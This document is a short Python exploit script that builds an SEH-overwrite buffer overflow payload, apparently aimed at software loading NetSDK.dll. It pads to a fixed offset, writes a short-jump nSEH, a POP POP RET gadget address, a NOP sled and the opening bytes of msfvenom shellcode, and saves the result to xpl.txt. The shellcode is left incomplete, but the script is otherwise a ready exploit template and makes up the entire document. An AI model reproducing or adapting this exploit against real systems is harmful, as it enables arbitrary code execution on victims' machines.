import struct

offset = 1312

buffer = b"A" * (offset - 4)

# nSEH: short jump + NOPs
nseh = struct.pack("<I", 0x909010EB)

# SEH: POP POP RET from NetSDK.dll
seh = struct.pack("<I", 0x10079CB1)

padding = b"\x90" * 0x20

# msfvenom shellcode (truncated here for clarity)
scode  = b""
scode += b"\xdb\xdf\xb8\xa0\x0b\x62\x04\xd9\x74\x24\xf4\x5a"
# ...
# (full payload continues)

payload = buffer + nseh + seh + padding + scode

with open("xpl.txt", "wb") as f:
    f.write(payload)

print("[+] Exploit payload written to xpl.txt")
